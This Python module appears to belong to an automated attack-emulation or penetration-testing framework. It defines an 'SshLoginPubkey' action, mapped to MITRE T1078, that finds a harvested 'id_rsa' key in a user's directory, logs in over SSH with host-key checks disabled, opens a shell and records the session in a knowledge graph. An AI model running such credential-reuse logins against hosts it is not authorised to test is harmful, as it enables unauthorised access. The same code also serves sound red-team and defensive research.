from typing import Union

import paramiko

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.action_utils import shell
from action_state_interface.exec import ActionExecutionError, ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, GraphDB, MultiPattern, Pattern, Relationship
from kg_api.query import Query
from Session import SessionManager
from motifs import ActionInputMotif, ActionOutputMotif, StateChangeOperation


def get_ssh_terminal(ip: str, username: str, key_filename: str = None, password: str = None):
    """
    Use SSH credentials to establish an SSH session.
    """
    # Initialize the SSH client
    client = paramiko.SSHClient()
    # pkey = paramiko.RSAKey.from_private_key_file(key_filename)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Connect to the remote server
    try:
        client.connect(ip, username=username, key_filename=key_filename, password=password, look_for_keys=False)
        # Start an interactive shell session
        ssh_session = client.invoke_shell()
        return ssh_session
    except paramiko.ssh_exception.NoValidConnectionsError:
        return None


class SshLoginPubkey(Action):
    """
    Use SSH key file to establish an SSH session.
    """

    def __init__(self):
        super().__init__("SshLoginPubkey", "T1078", "TA0001", ["quiet", "fast"])
        self.noise = 0.1
        self.impact = 0.5
        self.input_motif = self.build_input_motif()
        self.output_motif = self.build_output_motif()

    @classmethod
    def build_input_motif(cls) -> ActionInputMotif:
        """
        Build the input motif for SshLoginPubkey.
        """
        input_motif = ActionInputMotif(
            name="InputMotif_SshLoginPubkey",
            description="Input motif for SshLoginPubkey"
        )

        input_motif.add_template(
            entity=Entity('Asset', alias='asset'),
            template_name="existing_asset",
        )

        input_motif.add_template(
            entity=Entity('OpenPort', alias='port'),
            template_name="existing_port",
            relationship_type="has",
            match_on="existing_asset",
            invert_relationship=True,
        )

        input_motif.add_template(
            entity=Entity('Service', alias='service', protocol='ssh'),
            template_name="existing_service",
            relationship_type="is_running",
            match_on="existing_port",
            invert_relationship=True,
        )

        input_motif.add_template(
            entity=Entity('Directory', alias='directory'),
            template_name="existing_directory",
            relationship_type="directed_path",
            match_on="existing_asset",
        )

        input_motif.add_template(
            entity=Entity('File', alias='file', filename='id_rsa'),
            template_name="existing_file",
            relationship_type="directed_path",
            match_on="existing_directory",
            expected_attributes=["artefact_id"],
        )

        input_motif.add_template(
            entity=Entity('User', alias='user'),
            template_name="existing_user",
            relationship_type="is_client",
            match_on="existing_service",
        )

        return input_motif

    @classmethod
    def build_output_motif(cls) -> ActionOutputMotif:
        """
        Build the output motif for SshLoginPubkey.
        """
        output_motif = ActionOutputMotif(
            name="OutputMotif_SshLoginPubkey",
            description="Output motif for SshLoginPubkey"
        )

        output_motif.add_template(
            entity=Entity('Credentials', alias='credentials'),
            template_name="discovered_credentials",
            relationship_type="secured_with",
            match_on=Entity('Service', alias='service', protocol='ssh'),
            expected_attributes=["username", "key_file"],
            operation=StateChangeOperation.MERGE_IF_NOT_MATCH,
        )

        output_motif.add_template(
            entity=Entity('Session', alias='session', protocol='ssh'),
            template_name="discovered_session",
            relationship_type="executes_on",
            match_on=Entity('Service', alias='service', protocol='ssh'),
            expected_attributes=["protocol", "username", "active", "id"],
        )

        return output_motif

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action.
        """
        ip = pattern.get('asset').get('ip_address')
        user = pattern.get('user').get('username')
        user_id = pattern.get('user')._id
        file = pattern.get('file').get('filename')
        file_id = pattern.get('file')._id
        directory = pattern.get('directory').get('dirname')
        directory_id = pattern.get('directory')._id
        return [
            f"Gain access to {ip} as {user} ({user_id}) using ssh key from file {file} ({file_id}) in directory {directory} ({directory_id})"
        ]

    def get_target_query(self) -> Query:
        """
        get_target_patterns check to identify SSH service entities, and derive login
        credentials from directory names and id files.
        """
        query = self.input_motif.get_query()
        query.where(self.input_motif.get_template('existing_directory').entity.dirname == self.input_motif.get_template('existing_user').entity.username)
        query.ret_all()
        return query

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Extract credentials from the target pattern and use them to
        establish an SSH session.
        """
        asset = pattern.get('asset')
        ip_address = asset.get('ip_address')
        user = pattern.get('user')
        username = user.get('username')
        file = pattern.get('file')
        ssh_artefact_id = file.get('artefact_id')

        ssh_key_file = artefacts.get_path(ssh_artefact_id)
        try:
            channel = get_ssh_terminal(ip_address, username, ssh_key_file)
            # Capture the output
            output = ""
            while channel.recv_ready():  # Keep receiving while data is available
                output += channel.recv(1024).decode()
        except Exception as e:
            raise ActionExecutionError(e)

        sess_id = sessions.add_session(channel)
        return ActionExecutionResult(
            command=["ssh", "-i", ssh_key_file, f"{username}@{ip_address}"],
            stdout=output,
            session=sess_id,
            logs=[f"Established session ID {sess_id} on {ip_address} with {username} and key file: {ssh_key_file}"],
        )

    def populate_output_motif(self, kg: GraphDB, pattern: Pattern, discovered_data: dict) -> StateChangeSequence:
        """
        Populate the output motif for SshLoginPubkey.
        """
        self.output_motif.reset_context()
        changes: StateChangeSequence = []

        user = pattern.get('user')
        username = user.get('username')
        service = pattern.get('service')

        changes.append(self.output_motif.instantiate(
            template_name="discovered_credentials",
            match_on_override=service,
            username=username,
            key_file=discovered_data['key_file'],
        ))

        changes.append(self.output_motif.instantiate(
            template_name="discovered_session",
            match_on_override=service,
            protocol='ssh',
            username=username,
            active=True,
            id=discovered_data['session_id'],
        ))

        return changes

    def parse_output(self, output: ActionExecutionResult) -> dict:
        """
        Parse the output of the action.
        """
        return {
            'session_id': output.session,
            'key_file': output.command[2],
        }

    def capture_state_change(
        self, kg: GraphDB, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """
        Update knowledge graph with newly established session.
        """
        discovered_data = self.parse_output(output)
        changes = self.populate_output_motif(kg, pattern, discovered_data)
        return changes